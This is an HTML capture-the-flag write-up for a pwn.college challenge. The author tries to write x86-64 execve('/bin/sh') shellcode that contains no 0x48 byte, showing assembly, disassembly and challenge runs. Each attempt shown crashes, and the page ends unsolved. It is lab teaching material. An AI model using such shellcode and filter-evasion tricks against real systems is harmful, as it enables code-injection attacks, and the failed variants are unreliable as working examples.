@@ -1,0 +1,441 @@
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.11.1/styles/default.min.css">
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.11.1/highlight.min.js"></script>
+
+<div style="background-color: #7FC6A4; padding: 10px; border: 10px ridge lightgreen;">
+  <h1 id="ello-ackers-">ello ackers!</h1>
+  <h2 id="statement">Statement</h2>
+  <p>Write and execute shellcode to read the flag, but your inputted data is filtered before execution.</p>
+  <h2 id="analyze">Analyze</h2>
+  <pre><code>hacker@program-security~ello-ackers:~$ /challenge/ello-ackers
+      <span class="hljs-comment">###</span>
+      <span class="hljs-comment">### Welcome to /challenge/ello-ackers!</span>
+      <span class="hljs-comment">###</span>
+
+      This challenge reads <span class="hljs-keyword">in</span> some <span class="hljs-keyword">bytes</span>, modifies
+      them (depending <span class="hljs-keyword">on</span> <span class="hljs-title">the</span> <span
+        class="hljs-title">specific</span> <span class="hljs-title">challenge</span> <span
+        class="hljs-title">configuration</span>), <span class="hljs-title">and</span> <span
+        class="hljs-title">executes</span> <span class="hljs-title">them</span>
+      <span class="hljs-keyword">as</span> code! This is <span class="hljs-keyword">a</span> common exploitation
+      scenario, called `code injection`. Through this series <span class="hljs-keyword">of</span> challenges, you will
+      practice your shellcode writing skills under various constraints! To ensure that you are shellcoding, rather than
+      doing
+      other tricks, this will sanitize all environment variables <span class="hljs-keyword">and</span> arguments <span
+        class="hljs-keyword">and</span> <span class="hljs-built_in">close</span> all <span
+        class="hljs-built_in">file</span> descriptors &gt; <span class="hljs-number">2.</span>
+
+      Mapped <span class="hljs-number">0x1000</span> <span class="hljs-keyword">bytes</span> <span
+        class="hljs-keyword">for</span> shellcode <span class="hljs-keyword">at</span> <span
+        class="hljs-number">0x29f77000</span>!
+      Reading <span class="hljs-number">0x1000</span> <span class="hljs-keyword">bytes</span> <span
+        class="hljs-built_in">from</span> <span class="hljs-keyword">stdin</span>.
+
+      truc
+      Executing <span class="hljs-built_in">filter</span>...
+
+      This challenge requires that your shellcode have no H <span class="hljs-keyword">bytes</span>!
+
+      This challenge is about <span class="hljs-built_in">to</span> execute <span class="hljs-keyword">the</span>
+      following shellcode:
+
+      Address | Bytes | Instructions
+      <span
+        class="hljs-comment">------------------------------------------------------------------------------------------</span>
+      <span class="hljs-number">0x0000000029f77000</span> | <span class="hljs-number">74</span> <span
+        class="hljs-number">72</span> | je <span class="hljs-number">0x29f77074</span>
+      <span class="hljs-number">0x0000000029f77002</span> | <span class="hljs-number">75</span> <span
+        class="hljs-number">63</span> | jne <span class="hljs-number">0x29f77067</span>
+
+      Executing shellcode!
+
+      Segmentation fault
+    </code></pre>
+  <p>Our goal is clear, we need to build a shellcode without any H byte (0x48) in it&#39;s machine instructions</p>
+  <h2 id="exploitation">Exploitation</h2>
+  <p>We’re therefore going to use a default shellcode provided in the pwn college tutorials.</p>
+  <pre><code><span class="hljs-meta">.intel_syntax</span> noprefix
+      <span class="hljs-meta">.global</span> _start
+      <span class="hljs-symbol">
+        _start:</span>
+      <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rsi</span>, <span class="hljs-number">0</span>
+      <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-number">0</span>
+      <span class="hljs-keyword">lea</span> <span class="hljs-built_in">rdi</span>, [<span
+        class="hljs-built_in">rip</span>+shell]
+      <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">59</span>
+      <span class="hljs-keyword">syscall</span>
+      <span class="hljs-symbol">
+        shell:</span>
+      <span class="hljs-meta"> .string</span> <span class="hljs-string">"/bin/sh"</span>
+    </code></pre>
+  <p>When you take a closer look at its composition, you can see a lot of H bytes (0x48).</p>
+  <pre><code>0000000000401000 &lt;_start&gt;:
+      401000: <span class="hljs-number"> 48 </span>c7 c6<span class="hljs-number"> 00 </span>00<span
+        class="hljs-number"> 00 </span>00 mov $0x0,%rsi
+      401007: <span class="hljs-number"> 48 </span>c7 c2<span class="hljs-number"> 00 </span>00<span
+        class="hljs-number"> 00 </span>00 mov $0x0,%rdx
+      40100e: <span class="hljs-number"> 48 </span>8d 3d<span class="hljs-number"> 09 </span>00<span
+        class="hljs-number"> 00 </span>00 lea 0x9(%rip),%rdi <span class="hljs-comment"># 40101e &lt;shell&gt;</span>
+      401015: <span class="hljs-number"> 48 </span>c7 c0 3b<span class="hljs-number"> 00 </span>00<span
+        class="hljs-number"> 00 </span> mov $0x3b,%rax
+      40101c: 0f<span class="hljs-number"> 05 </span> syscall
+    </code></pre>
+  <p>After a few tests, we notice that these 0x48 bytes disappear when we avoid using 64-bit registers.</p>
+  <pre><code><span class="hljs-meta">.intel_syntax</span> noprefix
+      <span class="hljs-meta">.global</span> _start
+      <span class="hljs-symbol">
+        _start:</span>
+      <span class="hljs-keyword">mov</span> <span class="hljs-built_in">esi</span>, <span class="hljs-number">0</span>
+      <span class="hljs-comment">;rsi -&gt; esi</span>
+      <span class="hljs-keyword">mov</span> <span class="hljs-built_in">edx</span>, <span class="hljs-number">0</span>
+      <span class="hljs-comment">;rdx -&gt; edx</span>
+      <span class="hljs-keyword">lea</span> <span class="hljs-built_in">rdi</span>, [<span
+        class="hljs-built_in">rip</span>+shell]
+      <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">59</span>
+      <span class="hljs-keyword">syscall</span>
+      <span class="hljs-symbol">
+        shell:</span>
+      <span class="hljs-meta"> .string</span> <span class="hljs-string">"/bin/sh"</span>
+    </code></pre>
+  <pre><code>0000000000401000 &lt;_start&gt;:
+      401000: be<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00 mov $0x0,%esi
+      401005: ba<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00 mov $0x0,%edx
+      40100a: <span class="hljs-number"> 48 </span>8d 3d<span class="hljs-number"> 09 </span>00<span
+        class="hljs-number"> 00 </span>00 lea 0x9(%rip),%rdi <span class="hljs-comment"># 40101a &lt;shell&gt;</span>
+      401011: <span class="hljs-number"> 48 </span>c7 c0 3b<span class="hljs-number"> 00 </span>00<span
+        class="hljs-number"> 00 </span> mov $0x3b,%rax
+      401018: 0f<span class="hljs-number"> 05 </span> syscall
+    </code></pre>
+  <p>All that’s left is to convert our shellcode into a format that’s both 32-bit and 64-bit friendly.</p>
+  <p>First, I change my approach to pass the &quot;/bin/sh&quot; string.
+    It will be pushed onto the stack and then passed to rdi.</p>
+  <pre><code><span class="hljs-meta">.intel_syntax</span> noprefix
+      <span class="hljs-meta">.global</span> _start
+      <span class="hljs-symbol">
+        _start:</span>
+      <span class="hljs-keyword">mov</span> <span class="hljs-built_in">esi</span>, <span class="hljs-number">0</span>
+      <span class="hljs-keyword">mov</span> <span class="hljs-built_in">edx</span>, <span class="hljs-number">0</span>
+      <span class="hljs-keyword">sub</span> <span class="hljs-built_in">rsp</span>, <span class="hljs-number">16</span>
+      <span class="hljs-keyword">mov</span> <span class="hljs-built_in">dword</span> <span
+        class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rsp</span>], <span
+        class="hljs-number">0x6e69622f</span>
+      <span class="hljs-keyword">mov</span> <span class="hljs-built_in">dword</span> <span
+        class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rsp</span>+<span class="hljs-number">4</span>],
+      <span class="hljs-number">0x0068732f</span>
+      <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span
+        class="hljs-built_in">rsp</span>
+      <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">59</span>
+      <span class="hljs-keyword">syscall</span>
+    </code></pre>
+  <p>Now let’s take a look at our H bytes (0x48).</p>
+  <pre><code>0000000000401000 &lt;_start&gt;:
+      401000: be<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00 mov $0x0,%esi
+      401005: ba<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00 mov $0x0,%edx
+      40100a: <span class="hljs-number"> 48 </span>83 ec<span class="hljs-number"> 10 </span> sub $0x10,%rsp
+      40100e: c7<span class="hljs-number"> 04 </span>24 2f<span class="hljs-number"> 62 </span>69 6e movl
+      $0x6e69622f,(%rsp)
+      401015: c7<span class="hljs-number"> 44 </span>24<span class="hljs-number"> 04 </span>2f<span class="hljs-number">
+        73 </span>68 movl $0x68732f,0x4(%rsp)
+      40101c: <span class="hljs-number"> 00 </span>
+      40101d: <span class="hljs-number"> 48 </span>89 e7 mov %rsp,%rdi
+      401020: <span class="hljs-number"> 48 </span>c7 c0 3b<span class="hljs-number"> 00 </span>00<span
+        class="hljs-number"> 00 </span> mov $0x3b,%rax
+      401027: 0f<span class="hljs-number"> 05 </span> syscall
+    </code></pre>
+  <p>So we need to:</p>
+  <ul>
+    <li>Reserve 8 bytes on the stack in a different way</li>
+    <li>Make rdi point to /bin/sh using another method</li>
+    <li>Change how the value 59 (0x3b) is assigned to rax</li>
+  </ul>
+  <p><strong>1 - Reserve 8 bytes on the stack in a different way</strong></p>
+  <p>To do this, we can place a value equivalent to 8 empty bytes on the stack, for example using rdx or rsi, which we
+    set to 0 just beforehand.</p>
+  <pre><code><span class="hljs-meta">.intel_syntax</span> noprefix
+      <span class="hljs-meta">.global</span> _start
+      <span class="hljs-symbol">
+        _start:</span>
+      <span class="hljs-keyword">mov</span> <span class="hljs-built_in">esi</span>, <span class="hljs-number">0</span>
+      <span class="hljs-keyword">mov</span> <span class="hljs-built_in">edx</span>, <span class="hljs-number">0</span>
+      <span class="hljs-keyword">push</span> <span class="hljs-built_in">rdx</span>
+      <span class="hljs-keyword">mov</span> <span class="hljs-built_in">dword</span> <span
+        class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rsp</span>], <span
+        class="hljs-number">0x6e69622f</span>
+      <span class="hljs-keyword">mov</span> <span class="hljs-built_in">dword</span> <span
+        class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rsp</span>+<span class="hljs-number">4</span>],
+      <span class="hljs-number">0x0068732f</span>
+      <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span
+        class="hljs-built_in">rsp</span>
+      <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">59</span>
+      <span class="hljs-keyword">syscall</span>
+    </code></pre>
+  <pre><code>0000000000401000 &lt;_start&gt;:
+      401000: be<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00 mov $0x0,%esi
+      401005: ba<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00 mov $0x0,%edx
+      40100a: <span class="hljs-number"> 52 </span> push %rdx
+      40100b: c7<span class="hljs-number"> 04 </span>24 2f<span class="hljs-number"> 62 </span>69 6e movl
+      $0x6e69622f,(%rsp)
+      401012: c7<span class="hljs-number"> 44 </span>24<span class="hljs-number"> 04 </span>2f<span class="hljs-number">
+        73 </span>68 movl $0x68732f,0x4(%rsp)
+      401019: <span class="hljs-number"> 00 </span>
+      40101a: <span class="hljs-number"> 48 </span>89 e7 mov %rsp,%rdi
+      40101d: <span class="hljs-number"> 48 </span>c7 c0 3b<span class="hljs-number"> 00 </span>00<span
+        class="hljs-number"> 00 </span> mov $0x3b,%rax
+      401024: 0f<span class="hljs-number"> 05 </span> syscall
+    </code></pre>
+  <p><strong>2 - Make rdi point to /bin/sh using another method</strong></p>
+  <p>By trying different methods, pushing rsp onto the stack and popping it into rdi avoids the H bytes (0x48) while
+    keeping the same idea.</p>
+  <pre><code><span class="hljs-meta">.intel_syntax</span> noprefix
+      <span class="hljs-meta">.global</span> _start
+      <span class="hljs-symbol">
+        _start:</span>
+      <span class="hljs-keyword">mov</span> <span class="hljs-built_in">esi</span>, <span class="hljs-number">0</span>
+      <span class="hljs-keyword">mov</span> <span class="hljs-built_in">edx</span>, <span class="hljs-number">0</span>
+      <span class="hljs-keyword">push</span> <span class="hljs-built_in">rdx</span>
+      <span class="hljs-keyword">mov</span> <span class="hljs-built_in">dword</span> <span
+        class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rsp</span>], <span
+        class="hljs-number">0x6e69622f</span>
+      <span class="hljs-keyword">mov</span> <span class="hljs-built_in">dword</span> <span
+        class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rsp</span>+<span class="hljs-number">4</span>],
+      <span class="hljs-number">0x0068732f</span>
+      <span class="hljs-keyword">push</span> <span class="hljs-built_in">rsp</span>
+      <span class="hljs-keyword">pop</span> <span class="hljs-built_in">rdi</span>
+      <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">59</span>
+      <span class="hljs-keyword">syscall</span>
+    </code></pre>
+  <pre><code><span class="hljs-number">0000000000401000</span> &lt;_start&gt;:
+      <span class="hljs-number">401000</span>: be <span class="hljs-number">00</span> <span
+        class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> mov
+      $0<span class="hljs-keyword">x</span><span class="hljs-number">0</span>,%esi
+      <span class="hljs-number">401005</span>: ba <span class="hljs-number">00</span> <span
+        class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> mov
+      $0<span class="hljs-keyword">x</span><span class="hljs-number">0</span>,%edx
+      <span class="hljs-number">40100</span>a: <span class="hljs-number">52</span> <span
+        class="hljs-keyword">push</span> %rdx
+      <span class="hljs-number">40100</span>b: c7 <span class="hljs-number">04</span> <span
+        class="hljs-number">24</span> <span class="hljs-number">2</span>f <span class="hljs-number">62</span> <span
+        class="hljs-number">69</span> <span class="hljs-number">6</span>e movl $0x6e69622f,(%rsp)
+      <span class="hljs-number">401012</span>: c7 <span class="hljs-number">44</span> <span
+        class="hljs-number">24</span> <span class="hljs-number">04</span> <span class="hljs-number">2</span>f <span
+        class="hljs-number">73</span> <span class="hljs-number">68</span> movl $0x68732f,<span
+        class="hljs-number">0x4</span>(%rsp)
+      <span class="hljs-number">401019</span>: <span class="hljs-number">00</span>
+      <span class="hljs-number">40101</span>a: <span class="hljs-number">54</span> <span
+        class="hljs-keyword">push</span> %rsp
+      <span class="hljs-number">40101</span>b: <span class="hljs-number">5</span>f <span class="hljs-keyword">pop</span>
+      %rdi
+      <span class="hljs-number">40101</span>c: <span class="hljs-number">48</span> c7 c<span
+        class="hljs-number">0</span> <span class="hljs-number">3</span>b <span class="hljs-number">00</span> <span
+        class="hljs-number">00</span> <span class="hljs-number">00</span> mov $0x3b,%rax
+      <span class="hljs-number">401023</span>: 0f <span class="hljs-number">05</span> <span
+        class="hljs-keyword">syscall</span>
+    </code></pre>
+  <p><strong>3 - Change how the value 59 (0x3b) is assigned to rax</strong></p>
+  <p>For this one, you just need to use a sub‑register of rax to give it the value 59 (0x3b).</p>
+  <pre><code><span class="hljs-meta">.intel_syntax</span> noprefix
+      <span class="hljs-meta">.global</span> _start
+      <span class="hljs-symbol">
+        _start:</span>
+      <span class="hljs-keyword">mov</span> <span class="hljs-built_in">esi</span>, <span class="hljs-number">0</span>
+      <span class="hljs-keyword">mov</span> <span class="hljs-built_in">edx</span>, <span class="hljs-number">0</span>
+      <span class="hljs-keyword">push</span> <span class="hljs-built_in">rdx</span>
+      <span class="hljs-keyword">mov</span> <span class="hljs-built_in">dword</span> <span
+        class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rsp</span>], <span
+        class="hljs-number">0x6e69622f</span>
+      <span class="hljs-keyword">mov</span> <span class="hljs-built_in">dword</span> <span
+        class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rsp</span>+<span class="hljs-number">4</span>],
+      <span class="hljs-number">0x0068732f</span>
+      <span class="hljs-keyword">push</span> <span class="hljs-built_in">rsp</span>
+      <span class="hljs-keyword">pop</span> <span class="hljs-built_in">rdi</span>
+      <span class="hljs-keyword">mov</span> <span class="hljs-built_in">al</span>, <span class="hljs-number">59</span>
+      <span class="hljs-keyword">syscall</span>
+    </code></pre>
+  <pre><code><span class="hljs-number">0000000000401000</span> &lt;_start&gt;:
+      <span class="hljs-number">401000</span>: be <span class="hljs-number">00</span> <span
+        class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> mov
+      $0<span class="hljs-keyword">x</span><span class="hljs-number">0</span>,%esi
+      <span class="hljs-number">401005</span>: ba <span class="hljs-number">00</span> <span
+        class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> mov
+      $0<span class="hljs-keyword">x</span><span class="hljs-number">0</span>,%edx
+      <span class="hljs-number">40100</span>a: <span class="hljs-number">52</span> <span
+        class="hljs-keyword">push</span> %rdx
+      <span class="hljs-number">40100</span>b: c7 <span class="hljs-number">04</span> <span
+        class="hljs-number">24</span> <span class="hljs-number">2</span>f <span class="hljs-number">62</span> <span
+        class="hljs-number">69</span> <span class="hljs-number">6</span>e movl $0x6e69622f,(%rsp)
+      <span class="hljs-number">401012</span>: c7 <span class="hljs-number">44</span> <span
+        class="hljs-number">24</span> <span class="hljs-number">04</span> <span class="hljs-number">2</span>f <span
+        class="hljs-number">73</span> <span class="hljs-number">68</span> movl $0x68732f,<span
+        class="hljs-number">0x4</span>(%rsp)
+      <span class="hljs-number">401019</span>: <span class="hljs-number">00</span>
+      <span class="hljs-number">40101</span>a: <span class="hljs-number">54</span> <span
+        class="hljs-keyword">push</span> %rsp
+      <span class="hljs-number">40101</span>b: <span class="hljs-number">5</span>f <span class="hljs-keyword">pop</span>
+      %rdi
+      <span class="hljs-number">40101</span>c: b<span class="hljs-number">0</span> <span class="hljs-number">3</span>b
+      mov $0x3b,%al
+      <span class="hljs-number">40101</span>e: 0f <span class="hljs-number">05</span> <span
+        class="hljs-keyword">syscall</span>
+    </code></pre>
+  <p>Our shellcode no longer contains any H bytes (0x48), all that’s left is to feed it to the challenge and see what
+    happens!</p>
+  <pre><code>\xbe^<span class="hljs-meta">@^</span><span class="hljs-meta">@^</span><span
+        class="hljs-meta">@^</span><span class="hljs-meta">@\xba^</span><span class="hljs-meta">@^</span><span
+        class="hljs-meta">@^</span><span class="hljs-meta">@^</span><span
+        class="hljs-meta">@R\xc7$/bin\xc7D$/sh^</span><span class="hljs-meta">@T_\xb0;^O^E</span>
+      Executing filter...
+
+      This challenge requires that your shellcode have no H bytes!
+
+      This challenge is about to execute the following shellcode:
+
+      Address |<span class="hljs-string"> Bytes </span>|<span class="hljs-string"> Instructions
+        ------------------------------------------------------------------------------------------
+        0x0000000029f77000 </span>|<span class="hljs-string"> be 00 00 00 00 </span>|<span class="hljs-string"> mov esi,
+        0
+        0x0000000029f77005 </span>|<span class="hljs-string"> ba 00 00 00 00 </span>|<span class="hljs-string"> mov edx,
+        0
+        0x0000000029f7700a </span>|<span class="hljs-string"> 52 </span>|<span class="hljs-string"> push rdx
+
+        Executing shellcode!
+
+        Segmentation fault</span>
+    </code></pre>
+  <p>It doesn&#39;t works...</p>
+  <p>Just to be safe, I’ll try to build a shellcode with no forbidden bytes at all:</p>
+  <ul>
+    <li><code>48</code></li>
+    <li><code>00</code></li>
+    <li><code>0a</code></li>
+    <li><code>0d</code></li>
+    <li><code>20</code></li>
+    <li><code>09</code></li>
+    <li><code>7f</code></li>
+  </ul>
+  <pre><code><span class="hljs-meta">.intel_syntax</span> noprefix
+      <span class="hljs-meta">.global</span> _start
+      <span class="hljs-symbol">
+        _start:</span>
+      <span class="hljs-keyword">xor</span> <span class="hljs-built_in">eax</span>, <span
+        class="hljs-built_in">eax</span>
+      <span class="hljs-keyword">push</span> <span class="hljs-built_in">rax</span>
+      <span class="hljs-keyword">push</span> <span class="hljs-built_in">rax</span>
+      <span class="hljs-keyword">mov</span> <span class="hljs-built_in">dword</span> <span
+        class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rsp</span>], <span
+        class="hljs-number">0x6e69622f</span>
+      <span class="hljs-keyword">mov</span> <span class="hljs-built_in">dword</span> <span
+        class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rsp</span>+<span class="hljs-number">4</span>],
+      <span class="hljs-number">0x68732f2f</span>
+      <span class="hljs-keyword">mov</span> <span class="hljs-built_in">byte</span> <span
+        class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rsp</span>+<span class="hljs-number">8</span>],
+      <span class="hljs-built_in">al</span>
+      <span class="hljs-keyword">push</span> <span class="hljs-built_in">rsp</span>
+      <span class="hljs-keyword">pop</span> <span class="hljs-built_in">rdi</span>
+      <span class="hljs-keyword">xor</span> <span class="hljs-built_in">esi</span>, <span
+        class="hljs-built_in">esi</span>
+      <span class="hljs-keyword">xor</span> <span class="hljs-built_in">edx</span>, <span
+        class="hljs-built_in">edx</span>
+      <span class="hljs-keyword">mov</span> <span class="hljs-built_in">al</span>, <span class="hljs-number">59</span>
+      <span class="hljs-keyword">syscall</span>
+    </code></pre>
+  <pre><code><span class="hljs-number">0000000000401000</span> &lt;_start&gt;:
+      <span class="hljs-number">401000</span>: <span class="hljs-number">31</span> c<span class="hljs-number">0</span>
+      <span class="hljs-keyword">xor</span> %eax,%eax
+      <span class="hljs-number">401002</span>: <span class="hljs-number">50</span> <span
+        class="hljs-keyword">push</span> %rax
+      <span class="hljs-number">401003</span>: <span class="hljs-number">50</span> <span
+        class="hljs-keyword">push</span> %rax
+      <span class="hljs-number">401004</span>: c7 <span class="hljs-number">04</span> <span
+        class="hljs-number">24</span> <span class="hljs-number">2</span>f <span class="hljs-number">62</span> <span
+        class="hljs-number">69</span> <span class="hljs-number">6</span>e movl $0x6e69622f,(%rsp)
+      <span class="hljs-number">40100</span>b: c7 <span class="hljs-number">44</span> <span
+        class="hljs-number">24</span> <span class="hljs-number">04</span> <span class="hljs-number">2</span>f <span
+        class="hljs-number">2</span>f <span class="hljs-number">73</span> movl $0x68732f2f,<span
+        class="hljs-number">0x4</span>(%rsp)
+      <span class="hljs-number">401012</span>: <span class="hljs-number">68</span>
+      <span class="hljs-number">401013</span>: <span class="hljs-number">88</span> <span class="hljs-number">44</span>
+      <span class="hljs-number">24</span> 08 mov %al,<span class="hljs-number">0x8</span>(%rsp)
+      <span class="hljs-number">401017</span>: <span class="hljs-number">54</span> <span
+        class="hljs-keyword">push</span> %rsp
+      <span class="hljs-number">401018</span>: <span class="hljs-number">5</span>f <span class="hljs-keyword">pop</span>
+      %rdi
+      <span class="hljs-number">401019</span>: <span class="hljs-number">31</span> f6 <span
+        class="hljs-keyword">xor</span> %esi,%esi
+      <span class="hljs-number">40101</span>b: <span class="hljs-number">31</span> d2 <span
+        class="hljs-keyword">xor</span> %edx,%edx
+      <span class="hljs-number">40101</span>d: b<span class="hljs-number">0</span> <span class="hljs-number">3</span>b
+      mov $0x3b,%al
+      <span class="hljs-number">40101</span>f: 0f <span class="hljs-number">05</span> <span
+        class="hljs-keyword">syscall</span>
+    </code></pre>
+  <p>Try:</p>
+  <pre><code>1\xc0PP\xc7$/bin\xc7D$//sh\x88D$^HT_1\xf61Ұ;^O^E
+      Executing filter...
+
+      This challenge requires that your shellcode have no H bytes!
+
+      This challenge is about to<span class="hljs-built_in"> execute </span>the following shellcode:
+
+      Address | Bytes | Instructions
+      ------------------------------------------------------------------------------------------
+      0x0000000029f77000 | 31 c0 |<span class="hljs-built_in"> xor </span>eax, eax
+      0x0000000029f77002 | 50 | push rax
+      0x0000000029f77003 | 50 | push rax
+
+      Executing shellcode!
+
+      Segmentation fault
+    </code></pre>
+  <p>Still the same...</p>
+  <p>Seeing that it fails as soon as I push /bin/sh onto the stack, I try a different approach by going back to my
+    previous, simpler code. I’ll use a bit shift and an or to build the string.</p>
+  <pre><code><span class="hljs-meta">.intel_syntax</span> noprefix
+      <span class="hljs-meta">.global</span> _start
+      <span class="hljs-symbol">
+        _start:</span>
+      <span class="hljs-keyword">mov</span> <span class="hljs-built_in">esi</span>, <span class="hljs-number">0</span>
+      <span class="hljs-keyword">mov</span> <span class="hljs-built_in">edx</span>, <span class="hljs-number">0</span>
+      <span class="hljs-keyword">mov</span> <span class="hljs-built_in">ebx</span>, <span class="hljs-number">0</span>
+
+      <span class="hljs-keyword">mov</span> <span class="hljs-built_in">ebx</span>, <span
+        class="hljs-number">0x0068732f</span>
+      <span class="hljs-keyword">shl</span> <span class="hljs-built_in">rbx</span>, <span class="hljs-number">32</span>
+      <span class="hljs-keyword">or</span> <span class="hljs-built_in">rbx</span>, <span
+        class="hljs-number">0x6e69622f</span>
+      <span class="hljs-keyword">push</span> <span class="hljs-built_in">rbx</span>
+
+      <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span
+        class="hljs-built_in">rsp</span>
+      <span class="hljs-keyword">mov</span> <span class="hljs-built_in">al</span>, <span class="hljs-number">59</span>
+      <span class="hljs-keyword">syscall</span>
+    </code></pre>
+  <pre><code><span class="hljs-number">0000000000401000</span> &lt;_start&gt;:
+      <span class="hljs-number">401000</span>: be <span class="hljs-number">00</span> <span
+        class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> mov
+      $0<span class="hljs-keyword">x</span><span class="hljs-number">0</span>,%esi
+      <span class="hljs-number">401005</span>: ba <span class="hljs-number">00</span> <span
+        class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> mov
+      $0<span class="hljs-keyword">x</span><span class="hljs-number">0</span>,%edx
+      <span class="hljs-number">40100</span>a: bb <span class="hljs-number">00</span> <span
+        class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> mov
+      $0<span class="hljs-keyword">x</span><span class="hljs-number">0</span>,%ebx
+      <span class="hljs-number">40100</span>f: bb <span class="hljs-number">2</span>f <span
+        class="hljs-number">73</span> <span class="hljs-number">68</span> <span class="hljs-number">00</span> mov
+      $0x68732f,%ebx
+      <span class="hljs-number">401014</span>: <span class="hljs-number">48</span> c1 e3 <span
+        class="hljs-number">20</span> shl $0x2<span class="hljs-number">0</span>,%rbx
+      <span class="hljs-number">401018</span>: <span class="hljs-number">48</span> <span class="hljs-number">81</span>
+      cb <span class="hljs-number">2</span>f <span class="hljs-number">62</span> <span class="hljs-number">69</span>
+      <span class="hljs-number">6</span>e <span class="hljs-keyword">or</span> $0x6e69622f,%rbx
+      <span class="hljs-number">40101</span>f: <span class="hljs-number">53</span> <span
+        class="hljs-keyword">push</span> %rbx
+      <span class="hljs-number">401020</span>: <span class="hljs-number">48</span> <span class="hljs-number">89</span>
+      e7 mov %rsp,%rdi
+      <span class="hljs-number">401023</span>: b<span class="hljs-number">0</span> <span class="hljs-number">3</span>b
+      mov $0x3b,%al
+      <span class="hljs-number">401025</span>: 0f <span class="hljs-number">05</span> <span
+        class="hljs-keyword">syscall</span>
+    </code></pre>
+  <p>But it has many H byte (0x48), I don&#39;t know how to fix them for the moment...</p>
+</div>
+
+<script>hljs.highlightAll();</script>
